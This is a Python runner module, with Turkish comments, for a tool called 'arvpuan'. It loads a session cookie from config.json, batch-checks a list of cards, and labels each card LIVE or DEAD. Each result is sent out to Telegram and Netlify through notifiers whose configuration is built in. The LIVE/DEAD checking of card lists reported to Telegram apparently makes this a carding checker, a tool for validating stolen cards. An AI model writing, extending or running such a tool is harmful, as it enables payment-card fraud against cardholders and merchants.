"""
Runner — hazir kullanim modulu.

Cookie'yi config.json'dan okur, terminal ciktisi renkli,
live kartlar otomatik Telegram + Netlify'a gider.

Kullanim:
    python -m arvpuan.runner            # config.json'dan cookie okur
    python -m arvpuan.runner cards.txt  # kart dosyasini arguman olarak ver
"""

import json
import os
import sys
from pathlib import Path

from .batch import BatchChecker
from .notifiers import TelegramNotifier, NetlifyNotifier

# ── ANSI renk kodlari ────────────────────────────────────────────────────────
_GREEN  = "\033[92m"
_RED    = "\033[91m"
_YELLOW = "\033[93m"
_CYAN   = "\033[96m"
_RESET  = "\033[0m"
_BOLD   = "\033[1m"

CONFIG_FILE = "config.json"
CONFIG_TEMPLATE = {
    "cookie": "BURAYA_COOKIE_YAPISTIR",
    "cards_file": "cards.txt",
    "delay": 20.0,
}


def _load_config() -> dict:
    """config.json'u okur, yoksa olusturur."""
    path = Path(CONFIG_FILE)
    if not path.exists():
        with open(path, "w", encoding="utf-8") as f:
            json.dump(CONFIG_TEMPLATE, f, indent=2, ensure_ascii=False)
        print(_YELLOW + "[!] config.json olusturuldu. Cookie'yi doldurup tekrar calistir." + _RESET)
        sys.exit(0)

    with open(path, encoding="utf-8") as f:
        cfg = json.load(f)

    cookie = cfg.get("cookie", "").strip()
    if not cookie or cookie == CONFIG_TEMPLATE["cookie"]:
        print(_RED + "[!] config.json icindeki cookie bos veya degistirilmemis!" + _RESET)
        print(_YELLOW + "    config.json dosyasini ac ve 'cookie' alanina gercek cookie'yi yapistir." + _RESET)
        sys.exit(1)

    return cfg


def _on_log(msg: str) -> None:
    """Renkli terminal ciktisi."""
    if msg.startswith("[LIVE]"):
        print(_BOLD + _GREEN + msg + _RESET)
    elif msg.startswith("[DEAD]"):
        print(_RED + msg + _RESET)
    elif msg.startswith("[ERR]"):
        print(_YELLOW + msg + _RESET)
    else:
        print(_CYAN + msg + _RESET)


def run(cards_file: str = None) -> None:
    """
    Hazir calistirici.

    Args:
        cards_file: Kart dosyasinin yolu. Verilmezse config.json'daki deger kullanilir.
    """
    cfg = _load_config()

    cookie     = cfg["cookie"]
    cards_path = cards_file or cfg.get("cards_file", "cards.txt")
    delay      = float(cfg.get("delay", 20.0))

    if not Path(cards_path).exists():
        print(_RED + "[!] Kart dosyasi bulunamadi: " + cards_path + _RESET)
        sys.exit(1)

    with open(cards_path, encoding="utf-8") as f:
        cards = [line.strip() for line in f if line.strip()]

    if not cards:
        print(_RED + "[!] Kart dosyasi bos!" + _RESET)
        sys.exit(1)

    print(_CYAN + _BOLD + "arvpuan basliyor — " + str(len(cards)) + " kart" + _RESET)

    # Notifier'lar — gomulu config kullanir, parametre gerekmez
    tg = TelegramNotifier()
    nl = NetlifyNotifier()

    def on_result(r):
        tg.send(r)
        nl.send(r)

    def on_done(live, dead, error):
        tg.send_summary(live, dead, error)
        print(
            _BOLD
            + _GREEN  + "LIVE:"  + str(live)
            + _RED    + "  DEAD:" + str(dead)
            + _YELLOW + "  ERR:"  + str(error)
            + _RESET
        )

    batch = BatchChecker(
        cookie=cookie,
        delay=delay,
        on_result=on_result,
        on_log=_on_log,
        on_done=on_done,
    )
    batch.run(cards)


if __name__ == "__main__":
    cards_arg = sys.argv[1] if len(sys.argv) > 1 else None
    run(cards_arg)
